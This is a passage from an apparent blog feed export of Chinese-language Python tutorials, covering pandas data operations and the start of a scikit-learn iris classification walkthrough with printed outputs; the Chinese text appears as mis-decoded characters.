2017-01-02  1  1  1  1  1  1  1
            A  B  C  D  E  F  E
2017-01-01  1  1  1  1  1  1  1
2017-01-02  1  1  1  1  1  1  1
2017-01-03  3  3  3  3  3  3  3
2017-01-04  3  3  3  3  3  3  3
              A    B    C    D    E    F    E
2017-01-01    1    1    1    1    1    1    1
2017-01-02    1    1    1    1    1    1    1
2017-01-03  NaN  NaN  NaN  NaN  NaN  NaN  NaN
2017-01-04  NaN  NaN  NaN  NaN  NaN  NaN  NaN
                A      B      C      D      E      F      E
2017-01-01  False  False  False  False  False  False  False
2017-01-02  False  False  False  False  False  False  False
2017-01-03   True   True   True   True   True   True   True
2017-01-04   True   True   True   True   True   True   True

è³‡æ–™æ“ä½œ# é‡å°æ¯ä¸€å€‹å€¼é€²è¡Œæ“ä½œdf.apply(lambda x: x.max() - x.min())




A    2.696944
B    5.285329
C    1.948946
D    2.615037
dtype: float64

ä¸²æ¥è³‡æ–™# ä¸²æ¥è³‡æ–™df = pd.DataFrame(np.random.randn(10, 4))print(df)pieces = [df[:3], df[3:7], df[7:]]print(pieces)print(pd.concat(pieces))

          0         1         2         3
0 -0.171208  2.200967  0.385574 -0.481588
1  1.447335  1.756239  0.083053  0.255434
2 -0.508576  0.818774 -0.438210 -0.819860
3  1.704828 -0.329642 -1.059202 -0.820319
4 -1.792491 -0.761873 -1.090574 -0.484552
5  0.166621  1.704577 -1.613185 -0.391985
6  0.806292  0.699608 -1.768223 -1.081318
7 -1.168532  0.768302  0.831701  0.422367
8  0.065940 -0.038649 -0.060712 -0.500365
9  0.623535  0.558461 -0.956861  1.229675
[          0         1         2         3
0 -0.171208  2.200967  0.385574 -0.481588
1  1.447335  1.756239  0.083053  0.255434
2 -0.508576  0.818774 -0.438210 -0.819860,           0         1         2         3
3  1.704828 -0.329642 -1.059202 -0.820319
4 -1.792491 -0.761873 -1.090574 -0.484552
5  0.166621  1.704577 -1.613185 -0.391985
6  0.806292  0.699608 -1.768223 -1.081318,           0         1         2         3
7 -1.168532  0.768302  0.831701  0.422367
8  0.065940 -0.038649 -0.060712 -0.500365
9  0.623535  0.558461 -0.956861  1.229675]
          0         1         2         3
0 -0.171208  2.200967  0.385574 -0.481588
1  1.447335  1.756239  0.083053  0.255434
2 -0.508576  0.818774 -0.438210 -0.819860
3  1.704828 -0.329642 -1.059202 -0.820319
4 -1.792491 -0.761873 -1.090574 -0.484552
5  0.166621  1.704577 -1.613185 -0.391985
6  0.806292  0.699608 -1.768223 -1.081318
7 -1.168532  0.768302  0.831701  0.422367
8  0.065940 -0.038649 -0.060712 -0.500365
9  0.623535  0.558461 -0.956861  1.229675

åˆä½µè³‡æ–™# åˆä½µè³‡æ–™left = pd.DataFrame(&#123;&#x27;key&#x27;: [&#x27;foo&#x27;, &#x27;foo&#x27;], &#x27;lval&#x27;: [1, 2]&#125;)right = pd.DataFrame(&#123;&#x27;key&#x27;: [&#x27;foo&#x27;, &#x27;foo&#x27;], &#x27;rval&#x27;: [4, 5]&#125;)print(pd.merge(left, right, on=&#x27;key&#x27;))

   key  lval  rval
0  foo     1     4
1  foo     1     5
2  foo     2     4
3  foo     2     5

æ–°å¢è³‡æ–™# æ–°å¢è³‡æ–™æ–¼æœ€å¾Œdf = pd.DataFrame(np.random.randn(8, 4), columns=[&#x27;A&#x27;,&#x27;B&#x27;,&#x27;C&#x27;,&#x27;D&#x27;])print(df)s = df.iloc[3]print(df.append(s, ignore_index=True))

          A         B         C         D
0  1.780499  1.207626  0.631475 -1.747506
1 -0.603999 -2.364099  1.153066  0.504784
2  0.721924  0.199784 -0.158318 -0.882946
3 -0.378070 -0.379311  0.478997  0.271056
4  0.620888 -0.366262 -0.738695 -0.380854
5 -0.587604 -1.728096  0.279645 -0.927843
6 -0.916445  2.921231 -0.795880  0.867531
7 -0.373190  1.526771  0.136712  0.015765
          A         B         C         D
0  1.780499  1.207626  0.631475 -1.747506
1 -0.603999 -2.364099  1.153066  0.504784
2  0.721924  0.199784 -0.158318 -0.882946
3 -0.378070 -0.379311  0.478997  0.271056
4  0.620888 -0.366262 -0.738695 -0.380854
5 -0.587604 -1.728096  0.279645 -0.927843
6 -0.916445  2.921231 -0.795880  0.867531
7 -0.373190  1.526771  0.136712  0.015765
8 -0.378070 -0.379311  0.478997  0.271056

ç¾¤çµ„æ“ä½œ# ç¾¤çµ„æ“ä½œprint(df.groupby([&#x27;A&#x27;,&#x27;B&#x27;]).sum())

                            C         D
A         B                            
-1.232691  0.489020  0.436602 -1.439868
-0.259460 -0.269874  1.655001  0.530137
-0.256261 -0.743254  0.128837  1.050430
 0.015723  0.596866 -0.232503  1.247810
 0.049633 -0.093130  0.895723  1.049938
 0.458667  0.348883 -0.681931 -0.517437
 1.446492  0.007736  0.208870  0.211517
 2.357912 -0.187805 -0.376578 -0.459085

ç¹ªåœ–# å°å‡ºåœ–è¡¨ts = pd.Series(np.random.randn(1000), index=pd.date_range(&#x27;1/1/2000&#x27;, periods=1000))ts = ts.cumsum()ts.plot()

&lt;matplotlib.axes._subplots.AxesSubplot at 0x11bc50f98&gt;


è¼¸å…¥&#x2F;è¼¸å‡º# è®€å–æª”æ¡ˆ/è¼¸å‡ºæª”æ¡ˆï¼Œæ”¯æ´ csv, h5, xlsx æª”æ¡ˆæ ¼å¼df.to_csv(&#x27;foo.csv&#x27;)pd.read_csv(&#x27;foo.csv&#x27;)df.to_excel(&#x27;foo.xlsx&#x27;, sheet_name=&#x27;Sheet1&#x27;)print(pd.read_excel(&#x27;foo.xlsx&#x27;, &#x27;Sheet1&#x27;, index_col=None, na_values=[&#x27;NA&#x27;]))

          A         B         C         D
0  1.446492  0.007736  0.208870  0.211517
1  0.049633 -0.093130  0.895723  1.049938
2 -1.232691  0.489020  0.436602 -1.439868
3 -0.259460 -0.269874  1.655001  0.530137
4  0.015723  0.596866 -0.232503  1.247810
5  0.458667  0.348883 -0.681931 -0.517437
6  2.357912 -0.187805 -0.376578 -0.459085
7 -0.256261 -0.743254  0.128837  1.050430

ç¸½çµä»¥ä¸Šæ•´ç†äº†ä¸€äº› Pandas æ ¸å¿ƒåŠŸèƒ½å’Œå¦‚ä½•æ“ä½œè³‡æ–™ï¼Œæ¥ä¸‹ä¾†æˆ‘å€‘å°‡ä»‹ç´¹å…¶ä»– Python è³‡æ–™ç§‘å­¸å’Œæ©Ÿå™¨å­¸ç¿’ç”Ÿæ…‹ç³»å’Œç›¸é—œå·¥å…·ã€‚
å»¶ä¼¸é–±è®€
10 Minutes to pandas
Pandas ä½¿ç”¨ (1)
Python Pandas - Understanding inplace&#x3D;True
pandaså­¦ä¹ ç¬”è®°
ã€Pythonå®æˆ˜ã€‘Pandasï¼šè®©ä½ åƒå†™SQLä¸€æ ·åšæ•°æ®åˆ†æï¼ˆä¸€ï¼‰

ï¼ˆimage via pydataã€nbcnewsï¼‰
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>Machine Learning</tag>
        <tag>æ©Ÿå™¨å­¸ç¿’</tag>
        <tag>AI</tag>
        <tag>Artificial Intelligence</tag>
        <tag>NLP</tag>
        <tag>Data Mining</tag>
        <tag>äººå·¥æ™ºæ…§</tag>
        <tag>ç›£ç£å¼å­¸ç¿’</tag>
        <tag>Supervised learning</tag>
        <tag>Numpy</tag>
        <tag>è³‡æ–™ç§‘å­¸</tag>
        <tag>data science</tag>
        <tag>data scientist</tag>
        <tag>pandas</tag>
      </tags>
  </entry>
  <entry>
    <title>ç”¨ Python è‡ªå­¸è³‡æ–™ç§‘å­¸èˆ‡æ©Ÿå™¨å­¸ç¿’å…¥é–€å¯¦æˆ°ï¼šScikit Learn åŸºç¤å…¥é–€</title>
    <url>/2017/11/24/python-data-science-and-machine-learning-scikit-learn-basic-tutorial/</url>
    <content><![CDATA[
å‰è¨€æœ¬ç³»åˆ—æ–‡ç« å°‡é€é Python åŠå…¶è³‡æ–™ç§‘å­¸èˆ‡æ©Ÿå™¨å­¸ç¿’ç”Ÿæ…‹ç³»ï¼ˆNumpyã€Scipyã€Pandasã€scikit-learnã€Statsmodelsã€Matplotlibã€Scrapyã€Kerasã€TensorFlow ç­‰ï¼‰ä¾†ç³»çµ±æ€§ä»‹ç´¹è³‡æ–™ç§‘å­¸èˆ‡æ©Ÿå™¨å­¸ç¿’ç›¸é—œçš„çŸ¥è­˜ã€‚åœ¨é€™å€‹å–®å…ƒä¸­æˆ‘å€‘å°‡ä»‹ç´¹ scikit-learn é€™å€‹æ©Ÿå™¨å­¸ç¿’å’Œè³‡æ–™åˆ†æç¥å…µåˆ©å™¨å’ŒåŸºæœ¬çš„æ©Ÿå™¨å­¸ç¿’å·¥ä½œæµç¨‹ã€‚æ¥ä¸‹ä¾†æˆ‘å€‘çš„ç¯„ä¾‹å°‡æœƒä½¿ç”¨ Anancondaã€Python3 å’Œ Jupyter Notebook é–‹ç™¼ç’°å¢ƒé€²è¡Œï¼Œè‹¥é‚„æ²’å®‰è£ç’°å¢ƒçš„è®€è€…è¨˜å¾—å…ˆè¡Œå®‰è£ã€‚é¦–å…ˆæˆ‘å€‘å…ˆä¾†èªè­˜ä¸€ä¸‹åŸºæœ¬æ©Ÿå™¨å­¸ç¿’å·¥ä½œæµç¨‹ï¼Œè®“è®€è€…å°æ–¼æ©Ÿå™¨å­¸ç¿’å·¥ä½œæµæœ‰åŸºæœ¬è€Œå…¨é¢çš„èªè­˜ã€‚
åŸºæœ¬æ©Ÿå™¨å­¸ç¿’å·¥ä½œæµç¨‹ï¼ˆMachine Learning Workflowï¼‰

æ˜ç¢ºå®šç¾©å•é¡Œ (Problem Definition)
ç²å–è³‡æ–™èˆ‡æ¢ç´¢æ€§è³‡æ–™åˆ†æ (Get Data &amp; Exploratory Data Analysis)
è³‡æ–™é è™•ç†èˆ‡ç‰¹å¾µå·¥ç¨‹ (Data Clean&#x2F;Preprocessing &amp; Feature Engineering)
è¨“ç·´æ¨¡å‹èˆ‡æ ¡èª¿ (Model Training)
æ¨¡å‹é©—è­‰ (Model Predict &amp; Testing)
æ¨¡å‹å„ªåŒ– (Model Optimization)
ä¸Šç·šé‹è¡Œ (Deploy Model)

æ˜ç¢ºå®šç¾©å•é¡Œ (Problem Definition)
æ˜ç¢ºå®šç¾©å•é¡Œæ˜¯é€²è¡Œæ©Ÿå™¨å­¸ç¿’å·¥ä½œæµçš„ç¬¬ä¸€æ­¥ã€‚ç”±æ–¼æ©Ÿå™¨å­¸ç¿’å’Œä¸€èˆ¬çš„ Web ç¶²é æ‡‰ç”¨ç¨‹å¼é–‹ç™¼æ¯”è¼ƒä¸ä¸€æ¨£ï¼Œå…¶éœ€è¦çš„é‹ç®—è³‡æºå’Œæ™‚é–“æˆæœ¬æ¯”è¼ƒé«˜ï¼Œè‹¥èƒ½ä¸€é–‹å§‹å°±å®šç¾©å¥½å•é¡Œä¸¦å°‡å•é¡ŒæŠ½è±¡ç‚ºæ•¸å­¸å•é¡Œå°‡æœ‰åŠ©æ–¼æˆ‘å€‘è¦è’é›†çš„è³‡æ–™é›†å’Œç¯€çœå·¥ä½œæµç¨‹çš„æ™‚é–“ã€‚
èˆ‰ä¾‹ä¾†èªªï¼Œæœ¬ç¯‡æ–‡ç« ç¯„ä¾‹å¸Œæœ›é æ¸¬ Iris é³¶å°¾èŠ±å±¬æ–¼å“ªä¸€å€‹é¡åˆ¥ï¼ˆsetosa å±±é³¶å°¾ã€versicolor è®Šè‰²é³¶å°¾ã€virginica ç¶­å‰å°¼äºé³¶å°¾ï¼‰ï¼Œé€™é‚Šæˆ‘å€‘å°±å¯ä»¥æ±ºå®šæ˜¯è¦é€²è¡Œæœ‰å°æ‡‰çµæœçš„ç›£ç£å¼å­¸ç¿’ï¼šäºŒå…ƒåˆ†é¡å•é¡Œï¼ˆbinary classificationï¼‰ã€å¤šé¡åˆ¥åˆ†é¡å•é¡Œï¼ˆmulti-classificationï¼‰é‚„æ˜¯é€£çºŒé‡çš„è¿´æ­¸å•é¡Œï¼ˆregressionï¼‰ï¼Œæˆ–æ˜¯æ²’æœ‰æ¨™ç±¤çµæœçš„éç›£ç£å¼å­¸ç¿’ï¼ˆä¾‹å¦‚ï¼šclusteringï¼‰ç­‰ï¼Œæˆ‘å€‘é€™é‚Šå‡è¨­é€™æ˜¯ä¸€å€‹å¤šé¡åˆ¥åˆ†é¡å•é¡Œï¼šçµ¦å®šæœªçŸ¥è³‡æ–™å¸Œæœ›èƒ½é æ¸¬èŠ±æœµå±¬æ–¼å“ªä¸€é¡ã€‚æ›å¥è©±èªªï¼Œå°±æ˜¯èªªæˆ‘å€‘å…ˆå®šç¾©å¥½æˆ‘å€‘æƒ³è¦è§£æ±ºæˆ–æ˜¯é æ¸¬çš„å•é¡Œï¼Œç„¶å¾Œå»è’é›†å°æ‡‰çš„è³‡æ–™ã€‚
ç²å–è³‡æ–™èˆ‡æ¢ç´¢æ€§è³‡æ–™åˆ†æ (Get Data &amp; Exploratory Data Analysis)
åŸºæœ¬ä¸Šè³‡æ–™é›†çš„å®Œæ•´æ€§æŸç¨®ç¨‹åº¦æ±ºå®šäº†é æ¸¬çµæœæ˜¯å¦èƒ½ç™¼æ®æ¨¡å‹æœ€å¤§åŠŸæ•ˆã€‚ç”±æ–¼æˆ‘å€‘æ˜¯æ•™å­¸æ–‡ç« ï¼Œé€™é‚Šæˆ‘å€‘çš„ç¯„ä¾‹ä½¿ç”¨ scikit-learn å…§å»ºçš„ç©å…·è³‡æ–™é›† Irisï¼ˆé³¶å°¾èŠ±ï¼‰çš„èŠ±è¼ã€èŠ±è•Šé•·å¯¬é€²è¡ŒèŠ±æœµé¡åˆ¥åˆ¤åˆ¥ï¼ˆsetosa å±±é³¶å°¾ã€versicolor è®Šè‰²é³¶å°¾ã€virginica ç¶­å‰å°¼äºé³¶å°¾ï¼‰ã€‚åœ¨é€™å€‹è³‡æ–™é›†ä¸­å·²ç¶“å¹«æˆ‘å€‘æ¨™è¨»å¥½æ¯ç­†è³‡æ–™å°æ‡‰çš„é¡åˆ¥ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥è¦–ç‚ºå¤šé¡åˆ¥åˆ†é¡å•é¡Œï¼ˆmulti-classificationï¼‰ã€‚

å¼•å…¥æ¨¡çµ„
# å¼•å…¥ numpyã€pd å’Œ sklearn(scikit-learn) æ¨¡çµ„import numpy as npimport pandas as pdfrom sklearn import datasets# å¼•å…¥ train_test_split åˆ†å‰²æ–¹æ³•ï¼Œæ³¨æ„åœ¨ sklearn v0.18 å¾Œ train_test_split å¾ sklearn.cross_validation å­æ¨¡çµ„æ¬åˆ° sklearn.model_selection ä¸­from sklearn.model_selection import train_test_split# å¼•å…¥ KNeighbors æ¨¡å‹from sklearn.neighbors import KNeighborsClassifierfrom sklearn.svm import LinearSVC

å¼•å…¥è³‡æ–™é›†ä¸¦é€²è¡Œæ¢ç´¢æ€§è³‡æ–™åˆ†æ
# å¼•å…¥ iris è³‡æ–™é›†raw_iris = datasets.load_iris()# æ¢ç´¢æ€§åˆ†æ Exploratory data analysisï¼Œäº†è§£è³‡æ–™é›†å…§å®¹# å…ˆå°å‡º key å€¼ï¼Œåˆ—å‡ºæœ‰å“ªäº›å€¼ï¼š[&#x27;data&#x27;, &#x27;target&#x27;, &#x27;target_names&#x27;, &#x27;DESCR&#x27;, &#x27;feature_names&#x27;]print(raw_iris.keys())# å°å‡º feature å€¼print(raw_iris[&#x27;data&#x27;])# å°å‡ºç›®æ¨™å€¼ï¼Œåˆ†åˆ¥å°æ‡‰çš„æ˜¯ä¸‰ç¨®èŠ±çš„é¡åˆ¥ï¼š[&#x27;setosa å±±é³¶å°¾&#x27; &#x27;versicolor è®Šè‰²é³¶å°¾&#x27; &#x27;virginica ç¶­å‰å°¼äºé³¶å°¾&#x27;]print(raw_iris[&#x27;target&#x27;])# å°å‡ºç›®æ¨™æ¨™ç±¤ï¼Œä¸‰ç¨®èŠ±çš„é¡åˆ¥ï¼š[&#x27;setosa&#x27; &#x27;versicolor&#x27; &#x27;virginica&#x27;]print(raw_iris[&#x27;target_names&#x27;])# å°å‡ºè³‡æ–™é›†å…§å®¹æè¿°print(raw_iris[&#x27;DESCR&#x27;])# å°å‡ºå±¬æ€§åç¨±ï¼Œ[&#x27;sepal length èŠ±è¼é•·åº¦ (cm)&#x27;, &#x27;sepal width èŠ±è¼å¯¬åº¦ (cm)&#x27;, &#x27;petal length èŠ±è•Šé•·åº¦ (cm)&#x27;, &#x27;petal width èŠ±è•Šå¯¬åº¦ (cm)&#x27;]print(raw_iris[&#x27;feature_names&#x27;])# é¡åˆ¥ç¨®é¡print(np.unique(raw_iris.target))

dict_keys([&#39;data&#39;, &#39;target&#39;, &#39;target_names&#39;, &#39;DESCR&#39;, &#39;feature_names&#39;])
[[ 5.1  3.5  1.4  0.2]
 [ 4.9  3.   1.4  0.2]
 [ 4.7  3.2  1.3  0.2]
 [ 4.6  3.1  1.5  0.2]
 [ 5.   3.6  1.4  0.2]
 [ 5.4  3.9  1.7  0.4]
 [ 4.6  3.4  1.4  0.3]
 [ 5.   3.4  1.5  0.2]
 [ 4.4  2.9  1.4  0.2]
 [ 4.9  3.1  1.5  0.1]
 [ 5.4  3.7  1.5  0.2]
 [ 4.8  3.4  1.6  0.2]
 [ 4.8  3.   1.4  0.1]
 [ 4.3  3.   1.1  0.1]
 [ 5.8  4.   1.2  0.2]
 [ 5.7  4.4  1.5  0.4]
 [ 5.4  3.9  1.3  0.4]
 [ 5.1  3.5  1.4  0.3]
 [ 5.7  3.8  1.7  0.3]
 [ 5.1  3.8  1.5  0.3]
 [ 5.4  3.4  1.7  0.2]
 [ 5.1  3.7  1.5  0.4]
 [ 4.6  3.6  1.   0.2]
 [ 5.1  3.3  1.7  0.5]
 [ 4.8  3.4  1.9  0.2]
 [ 5.   3.   1.6  0.2]
 [ 5.   3.4  1.6  0.4]
 [ 5.2  3.5  1.5  0.2]
 [ 5.2  3.4  1.4  0.2]
 [ 4.7  3.2  1.6  0.2]
 [ 4.8  3.1  1.6  0.2]
 [ 5.4  3.4  1.5  0.4]
 [ 5.2  4.1  1.5  0.1]
 [ 5.5  4.2  1.4  0.2]
 [ 4.9  3.1  1.5  0.1]
 [ 5.   3.2  1.2  0.2]
 [ 5.5  3.5  1.3  0.2]
 [ 4.9  3.1  1.5  0.1]
 [ 4.4  3.   1.3  0.2]
 [ 5.1  3.4  1.5  0.2]
 [ 5.   3.5  1.3  0.3]
 [ 4.5  2.3  1.3  0.3]
 [ 4.4  3.2  1.3  0.2]
 [ 5.   3.5  1.6  0.6]
 [ 5.1  3.8  1.9  0.4]
 [ 4.8  3.   1.4  0.3]
 [ 5.1  3.8  1.6  0.2]
 [ 4.6  3.2  1.4  0.2]
 [ 5.3  3.7  1.5  0.2]
 [ 5.   3.3  1.4  0.2]
 [ 7.   3.2  4.7  1.4]
 [ 6.4  3.2  4.5  1.5]
 [ 6.9  3.1  4.9  1.5]
 [ 5.5  2.3  4.   1.3]
 [ 6.5  2.8  4.6  1.5]
 [ 5.7  2.8  4.5  1.3]
 [ 6.3  3.3  4.7  1.6]
 [ 4.9  2.4  3.3  1. ]
 [ 6.6  2.9  4.6  1.3]
 [ 5.2  2.7  3.9  1.4]
 [ 5.   2.   3.5  1. ]
 [ 5.9  3.   4.2  1.5]
 [ 6.   2.2  4.   1. ]
 [ 6.1  2.9  4.7  1.4]
 [ 5.6  2.9  3.6  1.3]
 [ 6.7  3.1  4.4  1.4]
 [ 5.6  3.   4.5  1.5]
 [ 5.8  2.7  4.1  1. ]
 [ 6.2  2.2  4.5  1.5]
 [ 5.6  2.5  3.9  1.1]
 [ 5.9  3.2  4.8  1.8]
 [ 6.1  2.8  4.   1.3]
 [ 6.3  2.5  4.9  1.5]
 [ 6.1  2.8  4.7  1.2]
 [ 6.4  2.9  4.3  1.3]
 [ 6.6  3.   4.4  1.4]
 [ 6.8  2.8  4.8  1.4]
 [ 6.7  3.   5.   1.7]
 [ 6.   2.9  4.5  1.5]
 [ 5.7  2.6  3.5  1. ]
 [ 5.5  2.4  3.8  1.1]
 [ 5.5  2.4  3.7  1. ]
 [ 5.8  2.7  3.9  1.2]
 [ 6.   2.7  5.1  1.6]
 [ 5.4  3.   4.5  1.5]
 [ 6.   3.4  4.5  1.6]
 [ 6.7  3.1  4.7  1.5]
 [ 6.3  2.3  4.4  1.3]
 [ 5.6  3.   4.1  1.3]
 [ 5.5  2.5  4.   1.3]
 [ 5.5  2.6  4.4  1.2]
 [ 6.1  3.   4.6  1.4]
 [ 5.8  2.6  4.   1.2]
 [ 5.   2.3  3.3  1. ]
 [ 5.6  2.7  4.2  1.3]
 [ 5.7  3.   4.2  1.2]
 [ 5.7  2.9  4.2  1.3]
 [ 6.2  2.9  4.3  1.3]
 [ 5.1  2.5  3.   1.1]
 [ 5.7  2.8  4.1  1.3]
 [ 6.3  3.3  6.   2.5]
 [ 5.8  2.7  5.1  1.9]
 [ 7.1  3.   5.9  2.1]
 [ 6.3  2.9  5.6  1.8]
 [ 6.5  3.   5.8  2.2]
 [ 7.6  3.   6.6  2.1]
 [ 4.9  2.5  4.5  1.7]
 [ 7.3  2.9  6.3  1.8]
 [ 6.7  2.5  5.8  1.8]
 [ 7.2  3.6  6.1  2.5]
 [ 6.5  3.2  5.1  2. ]
 [ 6.4  2.7  5.3  1.9]
 [ 6.8  3.   5.5  2.1]
 [ 5.7  2.5  5.   2. ]
 [ 5.8  2.8  5.1  2.4]
 [ 6.4  3.2  5.3  2.3]
 [ 6.5  3.   5.5  1.8]
 [ 7.7  3.8  6.7  2.2]
 [ 7.7  2.6  6.9  2.3]
 [ 6.   2.2  5.   1.5]
 [ 6.9  3.2  5.7  2.3]
 [ 5.6  2.8  4.9  2. ]
 [ 7.7  2.8  6.7  2. ]
 [ 6.3  2.7  4.9  1.8]
 [ 6.7  3.3  5.7  2.1]
 [ 7.2  3.2  6.   1.8]
 [ 6.2  2.8  4.8  1.8]
 [ 6.1  3.   4.9  1.8]
 [ 6.4  2.8  5.6  2.1]
 [ 7.2  3.   5.8  1.6]
 [ 7.4  2.8  6.1  1.9]
 [ 7.9  3.8  6.4  2. ]
 [ 6.4  2.8  5.6  2.2]
 [ 6.3  2.8  5.1  1.5]
 [ 6.1  2.6  5.6  1.4]
 [ 7.7  3.   6.1  2.3]
 [ 6.3  3.4  5.6  2.4]
 [ 6.4  3.1  5.5  1.8]
 [ 6.   3.   4.8  1.8]
 [ 6.9  3.1  5.4  2.1]
 [ 6.7  3.1  5.6  2.4]
 [ 6.9  3.1  5.1  2.3]
 [ 5.8  2.7  5.1  1.9]
 [ 6.8  3.2  5.9  2.3]
 [ 6.7  3.3  5.7  2.5]
 [ 6.7  3.   5.2  2.3]
 [ 6.3  2.5  5.   1.9]
 [ 6.5  3.   5.2  2. ]
 [ 6.2  3.4  5.4  2.3]
 [ 5.9  3.   5.1  1.8]]
[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
 0 0 0 0 0 0 0 0 0 0 0 0 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1
 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 2
 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2
 2 2]
[&#39;setosa&#39; &#39;versicolor&#39; &#39;virginica&#39;]
Iris Plants Database
====================

Notes
-----
Data Set Characteristics:
    :Number of Instances: 150 (50 in each of three classes)
    :Number of Attributes: 4 numeric, predictive attributes and the class
    :Attribute Information:
        - sepal length in cm
        - sepal width in cm
        - petal length in cm
        - petal width in cm
        - class:
                - Iris-Setosa
                - Iris-Versicolour
                - Iris-Virginica
    :Summary Statistics:

    ============== ==== ==== ======= ===== ====================
                    Min  Max   Mean    SD   Class Correlation
    ============== ==== ==== ======= ===== ====================
    sepal length:   4.3  7.9   5.84   0.83    0.7826
    sepal width:    2.0  4.4   3.05   0.43   -0.4194
    petal length:   1.0  6.9   3.76   1.76    0.9490  (high!)
    petal width:    0.1  2.5   1.20  0.76     0.9565  (high!)
    ============== ==== ==== ======= ===== ====================

    :Missing Attribute Values: None
    :Class Distribution: 33.3% for each of 3 classes.
    :Creator: R.A. Fisher
    :Donor: Michael Marshall (MARSHALL%PLU@io.arc.nasa.gov)
    :Date: July, 1988

This is a copy of UCI ML iris datasets.
http://archive.ics.uci.edu/ml/datasets/Iris

The famous Iris database, first used by Sir R.A Fisher

This is perhaps the best known database to be found in the
pattern recognition literature.  Fisher&#39;s paper is a classic in the field and
is referenced frequently to this day.  (See Duda &amp; Hart, for example.)  The
data set contains 3 classes of 50 instances each, where each class refers to a
type of iris plant.  One class is linearly separable from the other 2; the
latter are NOT linearly separable from each other.

References
----------
   - Fisher,R.A. &quot;The use of multiple measurements in taxonomic problems&quot;
     Annual Eugenics, 7, Part II, 179-188 (1936); also in &quot;Contributions to
     Mathematical Statistics&quot; (John Wiley, NY, 1950).
   - Duda,R.O., &amp; Hart,P.E. (1973) Pattern Classification and Scene Analysis.
     (Q327.D83) John Wiley &amp; Sons.  ISBN 0-471-22361-1.  See page 218.
   - Dasarathy, B.V. (1980) &quot;Nosing Around the Neighborhood: A New System
     Structure and Classification Rule for Recognition in Partially Exposed
     Environments&quot;.  IEEE Transactions on Pattern Analysis and Machine
     Intelligence, Vol. PAMI-2, No. 1, 67-71.
   - Gates, G.W. (1972) &quot;The Reduced Nearest Neighbor Rule&quot;.  IEEE Transactions
     on Information Theory, May 1972, 431-433.
   - See also: 1988 MLC Proceedings, 54-64.  Cheeseman et al&quot;s AUTOCLASS II
     conceptual clustering system finds 3 classes in the data.
   - Many, many more ...

[&#39;sepal length (cm)&#39;, &#39;sepal width (cm)&#39;, &#39;petal length (cm)&#39;, &#39;petal width (cm)&#39;]
[0 1 2]

è³‡æ–™é è™•ç†èˆ‡ç‰¹å¾µå·¥ç¨‹ (Data Clean&#x2F;Preprocessing &amp; Feature Engineering)
è‰¯å¥½çš„è³‡æ–™è¼¸å…¥å–æ±ºæ–¼è³‡æ–™é è™•ç†èˆ‡ç‰¹å¾µå·¥ç¨‹ï¼Œè€Œå¥½çš„è¼¸å…¥å°‡å¤§å¤§å½±éŸ¿åˆ°æ¨¡å‹æ˜¯å¦å¯ä»¥ç™¼æ®å…¶ç†è«–æ­£å¸¸æ°´æº–ã€‚ä»¥ä¸‹æŠŠè³‡æ–™è½‰æˆ DataFrame æ ¼å¼æ–¹ä¾¿é€²è¡Œæ“ä½œã€‚ç”±æ–¼é€™é‚Šçš„è³‡æ–™é›†å·²ç¶“æ˜¯ç›¸ç•¶å®Œæ•´çš„è³‡æ–™é›†ï¼Œæ‰€ä»¥æˆ‘å€‘é€™é‚Šå°±ä¸ç”¨ç‰¹åˆ¥é€²è¡Œè³‡æ–™é è™•ç†å’Œç‰¹å¾µå·¥ç¨‹çš„éƒ¨ä»½ï¼Œç„¶è€Œåœ¨çœŸå¯¦ä¸–ç•Œä¸­ï¼ŒçœŸæ­£åœ¨é€²è¡Œæ©Ÿå™¨å­¸ç¿’å·¥ä½œæµç¨‹çš„æ™‚å€™è³‡æ–™é è™•ç†å¾€å¾€æ˜¯æœ€èŠ±æ™‚é–“çš„éƒ¨ä»½ã€‚åŒæ™‚ç‚ºäº†æ–¹ä¾¿æ¨¡å‹çš„æ ¡èª¿ï¼Œæˆ‘å€‘é€™é‚ŠæŠŠè³‡æ–™é›†åˆ†ç‚º 70% è¨“ç·´è³‡æ–™ï¼Œ30% é©—è­‰è³‡æ–™ã€‚
# å°‡è³‡æ–™è½‰ç‚º pandas DataFrame# data ç‚ºè§€å¯Ÿç›®æ¨™è®Šæ•¸df_X = pd.DataFrame(raw_iris.data)# target ç‚ºé æ¸¬è®Šæ•¸df_y = pd.DataFrame(raw_iris.target)# å°‡è³‡æ–™åˆ‡åˆ†ç‚º training data å’Œ testing dataï¼Œå…¶ä¸­ random_state è‹¥è¨­ç‚º 0 æˆ–ä¸è¨­å‰‡å³ä¾¿å¯¦ä¾‹ä¸åŒä½†å› ç¨®å­ç›¸åŒç”¢ç”ŸåŒæ¨£éš¨æ©Ÿç·¨è™Ÿï¼Œè‹¥è¨­ç‚º 1 å‰‡æ¯æ¬¡éš¨æ©Ÿç”¢ç”Ÿä¸åŒç·¨è™Ÿ# test_size ç‚ºåˆ‡åˆ† training data å’Œ testing data çš„æ¯”ä¾‹X_train, X_test, y_train, y_test = train_test_split(df_X, df_y, test_size=0.3)

# å°å‡ºæ‰€æœ‰è³‡æ–™é›†ç­†æ•¸print(len(df_y))
150

# å°å‡ºåˆ‡åˆ† y_train çš„æ•¸é‡ç‚ºæ‰€æœ‰è³‡æ–™é›†çš„ 70%ï¼Œå…± 105 ç­†print(y_train)print(len(y_train))
     0
39   0
106  2
99   1
0    0
16   0
118  2
80   1
29   0
11   0
104  2
100  2
72   1
108  2
42   0
20   0
31   0
115  2
111  2
89   1
83   1
130  2
41   0
66   1
120  2
113  2
6    0
126  2
62   1
23   0
97   1
..  ..
10   0
76   1
129  2
144  2
137  2
12   0
79   1
123  2
127  2
36   0
74   1
37   0
131  2
110  2
22   0
32   0
147  2
